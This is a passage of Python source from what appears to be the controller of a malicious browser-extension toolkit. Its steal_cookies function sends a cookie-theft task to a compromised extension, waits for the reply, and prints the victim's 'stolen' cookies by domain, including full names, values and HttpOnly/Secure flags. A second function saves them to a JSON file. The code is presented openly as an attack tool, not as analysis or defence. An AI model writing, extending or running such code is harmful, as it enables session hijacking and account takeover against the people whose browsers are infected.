# ──────────────────────────────────────────────────────

def steal_cookies():
    """Send a cookies task to the extension and display the results."""
    tid, evt = submit_task(task_type='cookies')

    print(f"  {YELLOW}[*] Cookie steal task #{tid} queued, waiting...{RESET}", end='', flush=True)
    result = wait_result(tid, evt, timeout=30)
    print(f"\r" + " " * 60 + "\r", end='')

    if not result:
        print(f"  {RED}[!] Timeout — no response from extension{RESET}")
        return

    if 'error' in result:
        print(f"  {RED}[!] Error: {result['error']}{RESET}")
        return

    cookies = result.get('cookies', [])
    if not cookies:
        print(f"  {YELLOW}[*] No cookies found in browser{RESET}")
        return

    print(f"  {GREEN}{BOLD}[+] Stolen {len(cookies)} cookie(s):{RESET}\n")

    # Group by domain
    domains = {}
    for c in cookies:
        d = c.get('domain', '(unknown)')
        domains.setdefault(d, []).append(c)

    for domain in sorted(domains.keys()):
        clist = domains[domain]
        print(f"  {CYAN}{BOLD}{domain}{RESET} ({len(clist)} cookie(s))")
        for c in clist:
            name  = c.get('name', '')
            value = c.get('value', '')
            path  = c.get('path', '/')
            secure = c.get('secure', False)
            http_only = c.get('httpOnly', False)
            expires = c.get('expirationDate', None)
            flags = []
            if secure:
                flags.append('Secure')
            if http_only:
                flags.append('HttpOnly')
            if c.get('sameSite', 'unspecified') != 'unspecified':
                flags.append(f"SameSite={c['sameSite']}")
            flag_str = f" [{', '.join(flags)}]" if flags else ""
            # Truncate long values for display
            disp_val = value if len(value) <= 80 else value[:77] + '...'
            print(f"    {GREEN}{name}{RESET}={disp_val}")
            print(f"      path={path}{flag_str}")
        print()

    # Also offer raw dump
    return cookies


def save_cookies(cookies, filename):
    """Save cookies to a JSON file."""
    with open(filename, 'w') as f:
        json.dump(cookies, f, indent=2)
    print(f"  {GREEN}[+] Saved {len(cookies)} cookies to {filename}{RESET}")


